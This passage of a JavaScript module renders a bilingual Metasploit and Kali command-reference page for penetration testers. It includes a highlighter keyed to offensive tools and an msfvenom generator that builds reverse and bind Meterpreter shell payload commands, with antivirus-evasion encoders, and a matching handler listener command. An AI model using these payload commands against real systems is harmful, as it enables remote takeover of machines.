  h = h.replace(/(msfconsole|msfvenom|nmap|masscan|hydra|john|hashcat|aircrack-ng|wireshark|burpsuite|nikto|dirb|gobuster|wpscan|sqlmap|xsser|beef-xss|metasploit|bettercap|responder|crackmapexec|impacket|enum4linux|smbclient|rpcclient|smbmap|evil-winrm|bloodhound|mimikatz|dirsearch|ffuf|wfuzz|commix|xsstrike|zaproxy|rustscan|unicornscan|zmap|netdiscover|searchsploit|cewl|crunch|airmon-ng|airodump-ng|aireplay-ng|reaver|bully|mdk4|macchanger|kismet|airgeddon|sublist3r|dnsrecon|dnsenum|procdump64|nishang|exiftool|steghide|binwalk|strings|fping|arp-scan|ophcrack|rsmangler|zap-cli|wash|hcxdumptool|hcxpcaptool|linenum|linpeas|winpeas|smbmap|psexec|wmiexec|atexec|dcomexec|smbexec|secretsdump|bloodhound-python|socat|chisel|nc|ssh)(?=\s|$)/gi, '<span style="color:#e91e63;font-weight:600">$1</span>');
  h = h.replace(/('(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*")/g, '<span style="color:#2e7d32">$1</span>');
  h = h.replace(/(--?\w[\w-]*)/g, '<span style="color:#1565c0">$1</span>');
  h = h.replace(/(https?:\/\/[^\s<>]+|(?:\d{1,3}\.){3}\d{1,3})/g, '<span style="color:#6a1b9a">$1</span>');
  return h;
}

export default function render(lang) {
  const t = (fa, en) => lang === 'fa' ? fa : en;
  const rtl = lang === 'fa' ? ' direction:rtl; text-align:right;' : '';
  const rtlLabel = lang === 'fa' ? ' style="direction:rtl;text-align:right"' : '';
  const styles = `
<style>
.msf-wrap { font-family:'Consolas','Courier New',monospace; color:var(--text);max-width:1200px;margin:0 auto;padding:8px }
.msf-wrap * { box-sizing:border-box }
.msf-search { width:100%;padding:12px 16px;border:2px solid var(--border);border-radius:var(--radius-md);background:var(--bg-1);color:var(--text);font-size:14px;margin-bottom:12px;outline:none;transition:border-color .2s }
.msf-search:focus { border-color:var(--primary,#1976d2) }
.msf-tabs { display:flex;flex-wrap:wrap;gap:5px;margin-bottom:16px }
.msf-tab { padding:8px 14px;border:1px solid var(--border);border-radius:var(--radius-sm);background:var(--bg-2);color:var(--text);cursor:pointer;font-size:12px;font-family:inherit;transition:all .15s;white-space:nowrap }
.msf-tab:hover { border-color:var(--primary,#1976d2);color:var(--primary,#1976d2) }
.msf-tab.active { background:var(--primary,#1976d2);color:#fff;border-color:var(--primary,#1976d2) }
.msf-card { border:1px solid var(--border);border-radius:var(--radius-md);margin-bottom:8px;overflow:hidden;background:var(--bg-1) }
.msf-card-header { display:flex;align-items:flex-start;gap:8px;padding:12px;cursor:pointer;user-select:none }
.msf-card-header:hover { background:var(--bg-2) }
.msf-card-cmd { flex:1;min-width:0 }
.msf-card-cmd code { display:block;font-family:'Consolas','Courier New',monospace;font-size:13px;line-height:1.5;word-break:break-all;white-space:pre-wrap;background:var(--bg-2);padding:6px 10px;border-radius:var(--radius-sm);border-left:3px solid var(--primary,#1976d2) }
.msf-card-desc { font-size:12px;color:var(--text-sec);margin-top:3px;padding-left:4px }
.msf-card-example { display:none;padding:8px 12px 12px;border-top:1px solid var(--border);font-size:12px;background:var(--bg-2) }
.msf-card-example.open { display:block }
.msf-card-example code { display:block;font-family:'Consolas','Courier New',monospace;font-size:12px;color:#2e7d32;padding:6px 8px;background:var(--bg-1);border-radius:var(--radius-sm);margin-top:4px }
.msf-copy-btn { padding:5px 10px;font-size:11px;border:1px solid var(--border);border-radius:var(--radius-sm);background:var(--bg-2);color:var(--text);cursor:pointer;font-family:inherit;flex-shrink:0;transition:all .15s }
.msf-copy-btn:hover { background:var(--primary,#1976d2);color:#fff;border-color:var(--primary,#1976d2) }
.msf-sec-title { font-size:16px;font-weight:700;margin:0 0 12px;padding-bottom:8px;border-bottom:2px solid var(--primary,#1976d2) }
.msf-gen-section { border:1px solid var(--border);border-radius:var(--radius-md);padding:16px;margin-bottom:16px;background:var(--bg-1) }
.msf-gen-section h4 { margin:0 0 12px;font-size:14px }
.msf-grid2 { display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px }
.msf-grid3 { display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px }
.msf-field { width:100%;padding:8px 10px;border:1px solid var(--border);border-radius:var(--radius-sm);background:var(--bg-2);color:var(--text);font-size:13px;font-family:inherit;outline:none }
.msf-field:focus { border-color:var(--primary,#1976d2) }
.msf-field::placeholder { color:var(--text-sec);opacity:.6 }
.msf-label { display:block;font-size:11px;font-weight:600;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px;color:var(--text-sec) }
.msf-btn { padding:10px 20px;border:none;border-radius:var(--radius-sm);background:var(--primary,#1976d2);color:#fff;font-size:13px;font-family:inherit;cursor:pointer;transition:opacity .15s;font-weight:600 }
.msf-btn:hover { opacity:.85 }
.msf-btn:active { opacity:.7 }
.msf-out { background:var(--bg-2);padding:12px;border-radius:var(--radius-sm);border-left:4px solid var(--primary,#1976d2);font-family:'Consolas','Courier New',monospace;font-size:13px;margin:10px 0 5px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5 }
.msf-gen-result { display:none;margin-top:12px }
.msf-gen-result.show { display:block }
.msf-pill { display:inline-block;background:var(--primary,#1976d2);color:#fff;font-size:10px;padding:2px 8px;border-radius:99px;margin-left:6px;font-weight:700 }
.msf-empty { text-align:center;padding:30px;color:var(--text-sec);font-size:14px }
@media(max-width:600px){.msf-grid2,.msf-grid3{grid-template-columns:1fr}}</style>`;

  const tCat = {
    'Metasploit Basics': t('اصول Metasploit', 'Metasploit Basics'),
    'Exploit Selection': t('انتخاب اکسپلویت', 'Exploit Selection'),
    'Payload Generation': t('تولید پیلود', 'Payload Generation'),
    'Post Exploitation': t('پس از بهره‌برداری', 'Post Exploitation'),
    'Meterpreter Commands': t('دستورات Meterpreter', 'Meterpreter Commands'),
    'Kali Essentials': t('ابزارهای ضروری کالی', 'Kali Essentials'),
    'Network Scanning': t('اسکن شبکه', 'Network Scanning'),
    'Password Cracking': t('شکستن رمزعبور', 'Password Cracking'),
    'Web App Testing': t('تست اپلیکیشن وب', 'Web App Testing'),
    'Wireless Tools': t('ابزارهای وایرلس', 'Wireless Tools'),
  };

  const tabsHtml = catKeys.map((k, i) =>
    `<button class="msf-tab${i === 0 ? ' active' : ''}" data-idx="${i}">${tCat[k]}</button>`
  ).join('');

  const paneHtml = catKeys.map((k, i) => {
    const entries = data[k];
    return `<div class="msf-pane" data-idx="${i}"${i !== 0 ? ' style="display:none"' : ''}>
      ${entries.map(e => `
      <div class="msf-card">
        <div class="msf-card-header" onclick="window.msfToggle(this)">
          <div class="msf-card-cmd">
            <code>${syntaxCmd(e.cmd)}</code>
            <div class="msf-card-desc">${htmlEncode(e.desc)}</div>
          </div>
          <button class="msf-copy-btn" onclick="event.stopPropagation();window.msfCopy(\`${htmlEncode(e.cmd)}\`)" data-cmd="${htmlEncode(e.cmd)}">${t('کپی', 'Copy')}</button>
        </div>
        <div class="msf-card-example">
          ${t('مثال', 'Example')}:
          <code>${htmlEncode(e.example)}</code>
        </div>
      </div>`).join('')}
    </div>`;
  }).join('');

  const genHtml = `
<div class="msf-gen-section">
  <h4>${t('تولید کننده پیلود (msfvenom)', 'Payload Generator (msfvenom)')}</h4>
  <div${rtl ? ' style="direction:rtl;text-align:right"' : ''}>
    <div class="msf-grid3">
      <div>
        <label class="msf-label">OS</label>
        <select id="msf-gen-os" class="msf-field">
          <option value="linux">Linux</option>
          <option value="windows" selected>Windows</option>
          <option value="mac">macOS</option>
          <option value="android">Android</option>
        </select>
      </div>
      <div>
        <label class="msf-label">${t('نوع پیلود', 'Payload Type')}</label>
        <select id="msf-gen-type" class="msf-field">
          <option value="reverse">${t('Reverse Shell', 'Reverse Shell')}</option>
          <option value="bind">${t('Bind Shell', 'Bind Shell')}</option>
        </select>
      </div>
      <div>
        <label class="msf-label">${t('معماری', 'Arch')}</label>
        <select id="msf-gen-arch" class="msf-field">
          <option value="x64">x64</option>
          <option value="x86">x86</option>
        </select>
      </div>
    </div>
    <div class="msf-grid2">
      <div>
        <label class="msf-label">LHOST</label>
        <input id="msf-gen-lhost" class="msf-field" type="text" placeholder="192.168.1.100">
      </div>
      <div>
        <label class="msf-label">LPORT</label>
        <input id="msf-gen-lport" class="msf-field" type="number" placeholder="4444">
      </div>
    </div>
    <div class="msf-grid2">
      <div>
        <label class="msf-label">${t('فرمت', 'Format')}</label>
        <select id="msf-gen-format" class="msf-field">
          <option value="exe">exe</option>
          <option value="elf">elf</option>
          <option value="apk">apk</option>
          <option value="py">py</option>
          <option value="php">php</option>
          <option value="asp">asp</option>
          <option value="aspx">aspx</option>
          <option value="jsp">jsp</option>
          <option value="war">war</option>
          <option value="ps1">ps1</option>
          <option value="raw">raw</option>
          <option value="python">python</option>
          <option value="bash">bash</option>
          <option value="macho">macho</option>
        </select>
      </div>
      <div>
        <label class="msf-label">${t('Encoder', 'Encoder')}</label>
        <select id="msf-gen-encoder" class="msf-field">
          <option value="">${t('بدون', 'None')}</option>
          <option value="x86/shikata_ga_nai">x86/shikata_ga_nai</option>
          <option value="x64/xor">x64/xor</option>
          <option value="x64/zutto_dekiru">x64/zutto_dekiru</option>
        </select>
      </div>
    </div>
    <button class="msf-btn" onclick="window.msfGenPayload()">${t('تولید دستور', 'Generate Command')}</button>
    <div class="msf-gen-result" id="msf-gen-result">
      <div class="msf-out" id="msf-gen-cmd"></div>
      <button class="msf-copy-btn" onclick="window.msfCopy(document.getElementById('msf-gen-cmd').textContent)">${t('کپی دستور', 'Copy Command')}</button>
      <div style="margin-top:8px"><strong>${t('دستور Handler', 'Handler Command')}:</strong></div>
      <div class="msf-out" id="msf-gen-handler"></div>
      <button class="msf-copy-btn" onclick="window.msfCopy(document.getElementById('msf-gen-handler').textContent)">${t('کپی Handler', 'Copy Handler')}</button>
    </div>
  </div>
</div>`;

  return `${styles}
<div class="msf-wrap"${rtlLabel}>
  <div class="msf-sec-title">${t('مرجع دستورات Metasploit و Kali', 'Metasploit & Kali Command Reference')}</div>
  <input class="msf-search" id="msf-search" type="text" placeholder="${t('جستجوی دستورات...', 'Search commands...')}" oninput="window.msfSearch(this.value)">
  <div class="msf-tabs" id="msf-tabs">${tabsHtml}</div>
  ${genHtml}
  ${paneHtml}
  <div class="msf-empty" id="msf-empty" style="display:none">${t('نتیجه‌ای یافت نشد', 'No results found')}</div>
</div>`;
}

export function init(lang) {
  const t = (fa, en) => lang === 'fa' ? fa : en;
  const root = document.getElementById('content');

  window.msfCopy = function(text) {
    navigator.clipboard.writeText(text);
  };

  window.msfToggle = function(el) {
    const example = el.parentElement.querySelector('.msf-card-example');
    if (example) example.classList.toggle('open');
  };

  window.msfSearch = function(q) {
    const val = q.toLowerCase().trim();
    const panes = root.querySelectorAll('.msf-pane');
    const empty = document.getElementById('msf-empty');
    let anyVisible = false;
    panes.forEach(pane => {
      const cards = pane.querySelectorAll('.msf-card');
      let paneMatch = false;
      cards.forEach(card => {
        const code = card.querySelector('code');
        const text = code ? code.textContent.toLowerCase() : '';
        const desc = card.querySelector('.msf-card-desc');
        const descText = desc ? desc.textContent.toLowerCase() : '';
        const match = !val || text.includes(val) || descText.includes(val);
        card.style.display = match ? '' : 'none';
        if (match) paneMatch = true;
      });
      pane.style.display = paneMatch ? '' : 'none';
      if (paneMatch) anyVisible = true;
    });
    empty.style.display = anyVisible || !val ? 'none' : 'block';
    if (!val) {
      const activeTab = root.querySelector('.msf-tab.active');
      if (activeTab) {
        const idx = activeTab.getAttribute('data-idx');
        root.querySelectorAll('.msf-pane').forEach(p => {
          p.style.display = p.getAttribute('data-idx') === idx ? '' : 'none';
        });
      }
    }
  };

  root.addEventListener('click', function(e) {
    const tab = e.target.closest('.msf-tab');
    if (tab && tab.closest('#msf-tabs')) {
      root.querySelectorAll('.msf-tab').forEach(t => t.classList.remove('active'));
      root.querySelectorAll('.msf-pane').forEach(p => p.style.display = 'none');
      tab.classList.add('active');
      const idx = tab.getAttribute('data-idx');
      const pane = root.querySelector(`.msf-pane[data-idx="${idx}"]`);
      if (pane) pane.style.display = '';
      const search = document.getElementById('msf-search');
      if (search) search.value = '';
      const empty = document.getElementById('msf-empty');
      if (empty) empty.style.display = 'none';
    }
  });

  window.msfGenPayload = function() {
    const os = document.getElementById('msf-gen-os').value;
    const type = document.getElementById('msf-gen-type').value;
    const arch = document.getElementById('msf-gen-arch').value;
    const lhost = document.getElementById('msf-gen-lhost').value.trim();
    const lport = document.getElementById('msf-gen-lport').value.trim();
    const fmt = document.getElementById('msf-gen-format').value;
    const enc = document.getElementById('msf-gen-encoder').value;
    if (!lhost || !lport) return;
    const osMap = { linux: 'linux', windows: 'windows', mac: 'osx', android: 'android' };
    const payloadMap = {
      'linux-reverse': arch === 'x64' ? 'linux/x64/meterpreter/reverse_tcp' : 'linux/x86/meterpreter/reverse_tcp',
      'linux-bind': arch === 'x64' ? 'linux/x64/meterpreter/bind_tcp' : 'linux/x86/meterpreter/bind_tcp',
      'windows-reverse': arch === 'x64' ? 'windows/x64/meterpreter/reverse_tcp' : 'windows/x86/meterpreter/reverse_tcp',
      'windows-bind': arch === 'x64' ? 'windows/x64/meterpreter/bind_tcp' : 'windows/x86/meterpreter/bind_tcp',
      'mac-reverse': 'osx/x64/meterpreter/reverse_tcp',
      'mac-bind': 'osx/x64/meterpreter/bind_tcp',
      'android-reverse': 'android/meterpreter/reverse_tcp',
      'android-bind': 'android/meterpreter/bind_tcp',
    };
    const key = `${os}-${type}`;
    const payload = payloadMap[key] || 'windows/x64/meterpreter/reverse_tcp';
    let cmd = 'msfvenom -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + lport;
    if (os === 'android') {
      cmd += ' -o payload.apk';
    } else {
      if (enc) cmd += ' -e ' + enc;
      cmd += ' -a ' + arch + ' --platform ' + osMap[os] + ' -f ' + fmt;
      const outName = 'payload.' + (fmt === 'python' ? 'py' : fmt === 'bash' ? 'sh' : fmt);
      cmd += ' -o ' + outName;
    }
    const handler = 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD ' + payload + '; set LHOST ' + lhost + '; set LPORT ' + lport + '; exploit"';
    document.getElementById('msf-gen-cmd').textContent = cmd;
    document.getElementById('msf-gen-handler').textContent = handler;
    document.getElementById('msf-gen-result').classList.add('show');
  };
}
